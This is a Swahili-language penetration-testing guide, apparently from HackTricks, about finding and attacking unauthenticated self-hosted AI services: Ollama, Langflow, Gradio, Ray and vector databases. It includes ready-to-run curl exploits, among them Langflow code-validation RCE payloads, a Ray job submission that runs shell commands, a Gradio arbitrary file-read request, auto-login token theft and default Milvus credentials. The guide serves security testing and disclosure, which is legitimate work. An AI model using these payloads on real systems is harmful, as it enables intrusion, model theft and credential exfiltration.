# Huduma za AI Zinazojipangisha Zilizo Wazi

{{#include ../banners/hacktricks-training.md}}

Timu zinazounda vipengele vya AI mara nyingi huendesha model runners, agent builders, demo UIs, compute clusters na vector databases zao. Nyingi ya zana hizi ziliundwa kwa ajili ya laptop au mtandao wa maabara uliofungwa, kwa hiyo **hazina uthibitishaji kwa chaguomsingi** au husafirishwa zikiwa na njia ya mkato ya uthibitishaji iliyowezeshwa. Mshambuliaji anapoweza kufikia huduma kama hiyo, athari kwa kawaida huwa katika makundi yafuatayo:

- Matumizi ya bure ya GPUs na models, na wizi wa models za faragha.
- Kuvuja kwa prompts, documents na embeddings.
- Kuvuja kwa siri kutoka kwenye process environment (LLM provider keys, cloud credentials).
- Utekelezaji wa code, kwa sababu baadhi ya APIs hizi huendesha code **kama kipengele**.

Ukurasa huu unaeleza jinsi ya kupata huduma hizi na mambo ya kujaribu kwenye kila aina ya API. Kwa kuimarisha self-hosted inference server na leak ya llama.cpp `/slots`, angalia [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Kwa mafaili hasidi ya model, angalia [AI Models RCE](AI-Models-RCE.md).

## Utambuzi wa Alama

Tuma maombi haya bila credentials. Jibu la JSON lenye fields zinazotarajiwa hutambua bidhaa, na mara nyingi version yake, ambayo hukuonyesha ni ukaguzi upi kati ya ulio hapa chini unaohusika. Ports ni chaguomsingi zilizoandikwa kwenye nyaraka au ports zinazotumika katika mifano rasmi ya uendeshaji.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Bidhaa | Port ya kawaida | Ombi lisilohitaji uthibitishaji | Kinachoitambulisha |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | JSON ya version, orodha ya models za ndani |
| Langflow | 7860 | `GET /api/v1/version` | JSON ya version ya Langflow |
| Gradio | 7860 | `GET /config` | App config yenye version ya Gradio na component IDs |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, orodha ya jobs zilizowasilishwa |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Thamani ya heartbeat, version ya Chroma |
| Qdrant | 6333 | `GET /`, `GET /collections` | Version ya Qdrant, orodha ya collections |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Version ya Weaviate, classes |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Orodha ya collections, au hitilafu ya uthibitishaji |

Huduma hizi pia mara nyingi huchapishwa nyuma ya reverse proxy chini ya path prefix (kwa mfano `/ollama/` au `/ray/`), kwa hiyo rudia maombi chini ya prefix yoyote inayopatikana kwenye JavaScript bundles au nyaraka za API.

## APIs za Inference na Usimamizi wa Model Zisizohitaji Uthibitishaji

Model runners kwa kawaida hutoa REST API moja inayochanganya routes za inference na routes za usimamizi. Ollama ni mfano mzuri. Haina uthibitishaji uliojengewa ndani na kwa chaguomsingi hufungamana na `127.0.0.1:11434`, huku `OLLAMA_HOST` ikibadilisha anwani ya bind.<sup>[[1]](#references)[[15]](#references)</sup> Docker image rasmi huweka `OLLAMA_HOST=0.0.0.0:11434` ndani ya container, hutangaza `EXPOSE 11434` na haina agizo la `USER`, kwa hiyo server huendeshwa kama root ndani ya container.<sup>[[16]](#references)</sup> `EXPOSE` haichapishi port kwenye host, kwa hiyo ufikikaji kutoka kwa host hutegemea deployment. Amri za `docker run` zilizoandikwa kwenye nyaraka hutumia `-p 11434:11434`, na Docker huchapisha mapping kama hiyo kwenye interfaces zote za host isipokuwa IP ya host itolewe.<sup>[[17]](#references)[[18]](#references)</sup>

Athari za kila kundi la routes kwa mshambuliaji:<sup>[[2]](#references)</sup>

| Routes | Athari bila uthibitishaji |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Orodha ya models za ndani na zilizopakiwa, ikijumuisha custom models za faragha |
| `POST /api/show` | Maelezo ya model, ikijumuisha Modelfile, template na **system prompt** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Inference ya bure kwenye hardware ya mwathiriwa |
| `POST /api/pull`, `/api/push` | Kufanya server ipakue kutoka, au ipakie model kwenye, registry iliyochaguliwa na mshambuliaji |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Kuunda, kubadilisha au kufuta models |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Orodha ya modeli iliyorejeshwa bila credentials tayari inathibitisha kuwa huduma imefichuka. Modeli maalum mara nyingi huwa na system prompt ya ndani kwenye `/api/show`. Pull kuelekea host yako inathibitisha kuwa seva hupakua manifests kutoka registries zilizochaguliwa na mshambuliaji. `/api/push` kuelekea registry yako hubadilisha ufichuaji huo kuwa wizi wa modeli. Usitumie routes za create au delete kwenye targets halisi.

Pull za registry pia ni eneo la mashambulizi ya parser, kwa sababu seva huhifadhi blobs kwa kutumia thamani kutoka kwenye manifest ya mbali. Katika Probllama (CVE-2024-37032, iliyorekebishwa katika Ollama 0.1.34), `digest` ya manifest ilitumika kama jina la faili bila uthibitishaji. Kwa hiyo, registry hasidi ingeweza kuandika faili nje ya saraka ya blobs kwa kutumia mfuatano wa `../`. Kuweka manifest hasidi ambayo digest yake ilielekeza kwenye faili ya ndani kulivuja faili hiyo kwa registry ya mshambuliaji. Wiz ilifikia RCE kwenye Docker, ambako seva huendeshwa kama root, kwa kuandika shared library na kuiongeza kwenye `/etc/ld.so.preload`, kisha kuita `/api/chat` ili mchakato mpya uipakie.<sup>[[15]](#references)</sup> Runner inapoweza kupakua kutoka kwenye registries zozote, kagua jinsi inavyogeuza sehemu za manifest kuwa njia za faili.

## API zilizoundwa kutekeleza code

### API za kuwasilisha kazi

Frameworks za distributed compute huchukulia utekelezaji wa code kuwa kipengele chao kikuu. Ray Jobs API kwenye porti ya dashboard (8265) hukubali amri ya shell ya `entrypoint` na kuiendesha kwenye cluster.<sup>[[19]](#references)</sup> Utafiti wa Oligo ShadowRay unaripoti kuwa Jobs API haina authorization na kwamba dashboard hufungamana na `0.0.0.0`. CVE-2023-48022 inayohusiana nayo inabishaniwa kwa sababu Ray inatarajia kuendeshwa ndani ya mtandao unaodhibitiwa pekee.<sup>[[20]](#references)</sup> Ray iliongeza uthibitishaji wa token wa hiari (`RAY_AUTH_MODE=token`) katika toleo la 2.52.0. Ray 2.59 huiwasha kwa chaguomsingi kwa clusters za ndani zinazoanzishwa kwa `ray.init()`; `ray start --head` bado inaweza kuanza bila uthibitishaji ikiwa token haipatikani. Ray inaeleza mpango mpana zaidi wa kuweka uthibitishaji kwa chaguomsingi katika toleo la 2.61, kwa hiyo kagua toleo lililosakinishwa na namna ya kuanzisha badala ya kudhani kuwa dashboard iko wazi.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Dashboards za aina hii pia zina routes saidizi zinazostahili kuchunguzwa kwenye matoleo ya zamani. Kabla ya Ray 2.8.1, `/log_proxy?url=` ilichukua URL yoyote ya HTTP(S) (SSRF hadi cloud metadata), na `/api/v0/logs/file` ilikubali njia yoyote ya `filename`; zote mbili hazikuhitaji uthibitishaji.<sup>[[8]](#references)</sup>

### Endpoints za "uthibitishaji" wa code zinazoendesha function definitions

Wajenzi wa agent wanaokubali vipengele maalum vya Python wakati mwingine "huthibitisha" code kwa kuichanganua kwa `ast` na kuendesha function definitions pekee kwa `exec()`. Hii si salama. Python hutathmini **decorators na thamani chaguomsingi za argument wakati wa kufafanua function**, kwa hiyo code iliyowekwa hapo huendeshwa hata kama function body haitatekelezwa kamwe. `POST /api/v1/validate/code` ya Langflow ilifanya kazi hivi, na haikuhitaji uthibitishaji kabla ya 1.3.0 (CVE-2025-3248). Kutoa exception yenye matokeo ya command husababisha endpoint kurudisha matokeo hayo kwenye response:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Pima endpoint yoyote inayokompile, kukagua sintaksia au “kukagua” msimbo wa mtumiaji ili kubaini muundo huu, na upendelee kutumia DNS callback kama uthibitisho.

### Njia za auto-login na tokeni ya superuser chaguomsingi

Zana za mtumiaji mmoja mara nyingi huja na njia ya mkato inayomwingiza kila mgeni kama msimamizi. Katika Langflow, `GET /api/v1/auto_login` hurudisha tokeni za superuser chaguomsingi kwa mpigaji yeyote wakati `AUTO_LOGIN` imewashwa. Ikiwa imezimwa, njia hiyo hujibu `Auto login is disabled.`.<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 hadi 1.10.0 iliwasha kipengele hiki kwa chaguomsingi (CVE-2026-9103). Kukichanganya na njia ya uthibitishaji wa msimbo inayohitaji uthibitishaji iliyoelezwa hapo juu hurejesha RCE bila uthibitishaji (CVE-2026-9198).<sup>[[24]](#references)[[25]](#references)</sup> Pakiti rasmi za toleo la sasa na picha za Docker huzima kuingia kiotomatiki na huhitaji nenosiri la superuser, lakini matawi ya usanidi huendelea kukiwasha.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Hata bila code execution, tokeni ya superuser hutoa ufikiaji wa kila flow na credentials za provider zilizohifadhiwa. Kwa ukaguzi wa sharti la awali unaohusiana katika majaribio ya kiotomatiki, angalia [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## Njia za kuhudumia faili na RPC katika ML demo UIs

Framework za ML demo huhudumia faili zilizopakiwa na zilizozalishwa kupitia njia ya jumla na kuruhusu frontend kuita wasaidizi wa component wa upande wa server. Gradio hutoa `/config`, `/upload` na `/file=<path>` kwa hili.<sup>[[5]](#references)</sup> Miundo miwili inafaa kujaribiwa kwenye framework yoyote inayofanana:

- **Traversal kutoka kwenye subdirectory ya upload:** ikiwa njia ya faili hukagua tu kwamba path inaanzia ndani ya folder ya muda, pakia faili ili kuunda subdirectory, kisha panda nje yake kwa kutumia `../` au `%2e%2e%2f`. Gradio 4.0 hadi 4.10 (CVE-2023-51449) ilikuwa na athari hii.<sup>[[26]](#references)[[27]](#references)</sup> Tuma ombi kwa `curl --path-as-is` ili client isirekebishe path.
- **Uelekezaji wa method yoyote:** endpoint inayotumia `getattr(component, fn_name)` pamoja na ingizo la mtumiaji humruhusu mshambuliaji kuita wasaidizi wa ndani. Kabla ya 4.13.0, `/component_server` ya Gradio ilifanya hivi. Katika matoleo ya 4.3 hadi 4.12, `move_resource_to_block_cache` ilinakili faili yoyote ya ndani hadi kwenye cache, ambako `/file=` ingeweza kuipakua. Katika matoleo ya 3.47 hadi 3.50.2, wasaidizi wengine waliruhusu kusoma faili na SSRF ya kusoma faili nzima.<sup>[[26]](#references)[[28]](#references)</sup> Server iliyorekebishwa hujibu `Function not found.` kwa wasaidizi ambao hawajawekwa alama kuwa server functions.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Kwenye Hugging Face Spaces, siri za Space ni environment variables, kwa hiyo `/proc/self/environ` ndiyo faili yenye thamani zaidi. Horizon3 ilisoma faili hilo kwa kutumia kichwa cha HTTP `Range`.<sup>[[26]](#references)</sup>

## Hifadhidata za vekta zinazotumiwa na RAG

RAG huhifadhi vipande vya hati asili, embeddings zake na metadata kwenye hifadhidata ya vekta, kisha assistant huweka matokeo bora zaidi kwenye prompt yake. Kwa hiyo, ufikiaji wa kusoma husababisha kuvuja kwa **maandishi ya kawaida ya hati za faragha**. Ufikiaji wa kuandika humwezesha mshambulizi kuingiza vipande vinavyorejeshwa baadaye kwenye prompt za watumiaji wengine; huu ni prompt injection isiyo ya moja kwa moja na inayoendelea (tazama [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Kwa hifadhidata za vekta zinazojihostia, hakikisha kama uthibitishaji umesanidiwa au ufikiaji usiojulikana umewezeshwa:

- **Qdrant**: instances zinazojitegemea husikiliza kwenye interfaces zote bila uthibitishaji. Ikisanidiwa, ufunguo huwekwa kwenye kichwa cha `api-key` au kama `Authorization: Bearer`. Ufunguo wa kusoma tu na funguo za kila collection zinaweza kuwepo.<sup>[[11]](#references)</sup>
- **Chroma**: uthibitishaji umezimwa kwa chaguomsingi. Uthibitishaji wa token hutumia `Authorization` au `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: ufikiaji usiojulikana ukiwezeshwa, maombi yasiyo na credentials huthibitishwa kama `user: anonymous` na kupata ruhusa zozote alizo nazo mtumiaji huyo.<sup>[[30]](#references)</sup>
- **Milvus**: uthibitishaji umezimwa isipokuwa `common.security.authorizationEnabled` iwe `true`. Ukiwashwa, mtumiaji chaguomsingi `root` ana nenosiri `Milvus` na muundo wa token ni `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Jibu lenye data ya faragha bila credentials linaashiria kuwa data imefichuka. Uthibitishaji ukiwa umewashwa, tathmini kando akaunti yoyote chaguomsingi ambayo haijabadilishwa:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Angalia kama payloads zina maandishi ya hati, vitambulishi vya watumiaji au majina ya tenant. Ili kuonyesha uwezo wa kuandika bila kuchafua data ya production, tengeneza na ufute mara moja collection tupu yenye jina lililo wazi, na ufanye hivyo tu ikiwa scope inaruhusu.

Uthibitishaji kwenye seva hizi unaweza pia kufanyika baada ya muda. Kwenye seva ya Python FastAPI ya Chroma (1.0.0 hadi angalau 1.5.8, CVE-2026-45829), route ya kuunda collection iliunda embedding function iliyotolewa na mteja kabla ya ukaguzi wa uthibitishaji. Configuration iliyorejelea modeli ya Hugging Face inayodhibitiwa na mshambuliaji, ikiwa na `trust_remote_code: true`, iliendesha code ya mshambuliaji hata pale ombi lilipokataliwa. Rust frontend haikuathirika.<sup>[[32]](#references)</sup> Ombi linapokuwa na configuration ya modeli au plugin, lijaribu bila credentials na uangalie kama kuna fetch ya kutoka nje kwenda kwenye repository yako ya modeli.

## References

- [1] [Maswali yanayoulizwa mara kwa mara kuhusu Ollama](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Nyaraka za Ollama API](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [README ya Langflow](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Chanzo cha Langflow - endpoints za API v1](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Chanzo cha Gradio - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Chanzo cha Gradio - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Chanzo cha Ray - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, matoleo ya 2.6.3, 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Chanzo cha Chroma - chaguo-msingi za Python client](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Chanzo cha Chroma - routes za seva ya FastAPI](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - Usalama](https://qdrant.tech/documentation/security/)
- [12] [Maelezo ya Qdrant OpenAPI](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Maelezo ya Weaviate OpenAPI](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Kuunganisha kwenye Seva ya Milvus](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: Udhaifu wa Ollama wa Remote Code Execution (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Dockerfile ya Ollama](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Nyaraka za Docker za Ollama](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - Kuchapisha na kufichua ports](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: Kampeni ya kwanza inayojulikana ya mashambulizi inayolenga AI workloads na kutumiwa porini](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Uthibitishaji wa tokeni za Ray](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - Si salama kwa kasi yoyote: Kutumia vibaya Python Exec kwa RCE isiyohitaji uthibitishaji katika Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Chanzo cha Langflow - login router](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Kutumia udhaifu wa kusoma faili katika Gradio kuiba siri kutoka Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Ushauri wa usalama wa Gradio GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Commit ya kurekebisha Gradio kwa `/component_server`](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Uthibitishaji asilia wa Chroma](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Uthibitishaji](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - Kuthibitisha ufikiaji wa mtumiaji](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast ilihudumiwa kabla ya uthibitishaji](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
{{#include ../banners/hacktricks-training.md}}
